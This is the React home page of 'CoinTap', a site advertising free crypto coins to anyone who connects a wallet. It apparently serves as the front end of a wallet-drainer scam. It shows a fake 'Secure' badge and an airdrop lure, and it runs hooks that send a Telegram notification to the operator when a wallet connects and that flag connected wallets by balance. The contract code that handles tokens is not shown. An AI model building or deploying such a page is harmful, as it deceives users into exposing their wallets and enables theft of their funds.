import styles from '@/styles/Home.module.css';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { GetTokens } from '../components/contract';
import Example from '@/components/Example';
import Section from '@/components/Section';
import SecurityFeatures from '@/components/SecurityFeatures';
import CloudflareProtection from '@/components/CloudflareProtection';
import Footer from '@/components/Footer';
import About from '@/components/About';
import Head from 'next/head';
import { SparklesIcon } from '@heroicons/react/20/solid';
import useWalletConnectNotification from '../hooks/useWalletConnectNotification';
import useLowBalanceNotification from '../hooks/useLowBalanceNotification';

export default function Home() {
  // Send Telegram notification when wallet connects
  useWalletConnectNotification();
  
  // Check for low balance wallets and send alerts
  useLowBalanceNotification();

  return (
    <>
      <CloudflareProtection />
      <Head>
        <title>CoinTap – Tap In, Get Free Coins</title>
        <meta
          name="description"
          content="Connect your wallet and start earning free coins instantly with CoinTap. Simple, secure, and rewarding — your gateway to effortless crypto rewards."
        />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />

        {/* Open Graph meta tags for social media */}
        <meta property="og:title" content="CoinTap – Tap In, Get Free Coins" />
        <meta
          property="og:description"
          content="Connect your wallet and start earning free coins instantly with CoinTap. Simple, secure, and rewarding — your gateway to effortless crypto rewards."
        />
        <meta property="og:type" content="website" />
        <meta
          property="og:url"
          content="https://cointap-app.vercel.app"
        />
        <meta
          property="og:image"
          content="https://cointap-app.vercel.app/banner.jpg"
        />

        {/* Twitter Card meta tags */}
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="CoinTap – Tap In, Get Free Coins" />
        <meta
          name="twitter:description"
          content="Connect your wallet and start earning free coins instantly with CoinTap. Simple, secure, and rewarding — your gateway to effortless crypto rewards."
        />
        <meta
          name="twitter:image"
          content="https://cointap-app.vercel.app/banner.jpg"
        />

        {/* Facebook Meta Tags */}
        <meta property="og:url" content="https://cointap-app.vercel.app" />
        <meta property="og:type" content="website" />
        <meta property="og:title" content="CoinTap – Tap In, Get Free Coins" />
        <meta
          property="og:description"
          content="Connect your wallet and start earning free coins instantly with CoinTap. Simple, secure, and rewarding — your gateway to effortless crypto rewards."
        />
        <meta property="og:image" content="https://cointap-app.vercel.app/banner.jpg" />

        {/* Other meta tags for SEO */}
        <meta name="author" content="CoinTap" />
        <meta
          name="keywords"
          content="crypto, rewards, free coins, wallet, CoinTap, airdrop"
        />
      </Head>
      <header>
        <div className={styles.header}>
          <div className="flex items-center space-x-3 rtl:space-x-reverse">
            <SparklesIcon className="h-8 w-8 text-blue-400" aria-hidden="true" />
            <span className="text-2xl font-bold text-white">CoinTap</span>
            {/* Security Status Indicator */}
            <div className="flex items-center gap-1 text-green-400 text-xs ml-4">
              <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
              <span>Secure</span>
            </div>
          </div>
          <div className="ml-2">
            <ConnectButton />
          </div>
        </div>
      </header>

      <main className={styles.main}>
        <About />
        <GetTokens />
        <Example />
        <Section />
        <SecurityFeatures />
        <Footer />
      </main>
    </>
  );
}
